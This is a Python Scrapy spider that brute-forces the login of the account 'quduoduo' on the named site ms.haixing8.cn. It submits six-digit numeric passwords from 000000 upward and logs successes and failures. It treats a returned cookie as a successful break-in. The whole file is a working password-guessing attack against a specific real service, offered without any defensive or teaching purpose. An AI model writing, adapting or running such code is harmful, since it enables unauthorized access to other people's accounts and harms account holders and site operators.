# -*- coding: utf-8 -*-
import scrapy
from scrapy import FormRequest
from scrapy.http.request import Request
import time,os,sys


class Haixing8Spider(scrapy.Spider):
    name = 'quduoduo' # 爬虫名称
    allowed_domains = ['http://ms.haixing8.cn'] # 允许的域名
    start_urls = ['http://ms.haixing8.cn'] # 起始url
    password = '000000'
    username = 'quduoduo'

    # 爬虫日志路径
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    FLOG_DIR = os.path.join(BASE_DIR,'log', name ,'fail.log')
    SLOG_DIR = os.path.join(BASE_DIR,'log', name ,'success.log')

    def start_requests(self):
        url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.start&spid=trdo&clienttype=WAP2'
        # return [Request(url=url, callback=self.login)]
        if not os.path.exists(os.path.join(self.BASE_DIR,'log', self.name)):
            os.mkdir(os.path.join(self.BASE_DIR,'log', self.name))
        yield Request(
            url=url, 
            callback = self.login,
            dont_filter = True # 相同url不过滤
            )

    def login(self, response):
        self.chink_password()
        url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.startover&amp;spid=&amp;clienttype=WAP2'
        form_data = {
            'username': self.username, 
            'password': self.password, 
            'submit': '确定'
            }  # 表单数据，字典格式，注意数字也要用引号引起来，否则报错。
        req = FormRequest(
            url = url, 
            method = 'POST',
            formdata = form_data,
            callback = self.check_login, # 传递当前验证的密码
            dont_filter = True # 相同url不过滤
            )
        # print('------------------start_login-----------------')
        yield req

    def check_login(self, response):
        header = response.headers
        if b'Set-Cookie' in header.keys():
            f = open(self.SLOG_DIR,'a+')
            f.write("%s:success---%s---password:%s\r" %(time.strftime("[%Y-%m-%d %H:%M:%S]"), self.username, self.password))
            f.close
            return
        elif len(str(self.password)) == 7:
            return
        else:
            f = open(self.FLOG_DIR,'a+')
            f.write("%s:fail---%s---password:%s\r" %(time.strftime("[%Y-%m-%d %H:%M:%S]"), self.username, self.password))
            f.close
            self.change_password()
            url = 'http://ms.haixing8.cn/commreg/channel.php?d=login.start&spid=trdo&clienttype=WAP2'
            # return [Request(url=url, callback=self.login)]
            yield Request(
                url = url,
                callback = self.login, 
                dont_filter = True
                )

    def chink_password (self):
        password = str(int(self.password))
        # 凑齐六位数
        if len(password) >= 6 :
            pass
        else:
            self.password = (6 - len(password))*"0" + password
    
    # 增加10，
    def change_password(self):
        password = int(self.password)
        password += 1
        self.password= str(password)
        self.chink_password()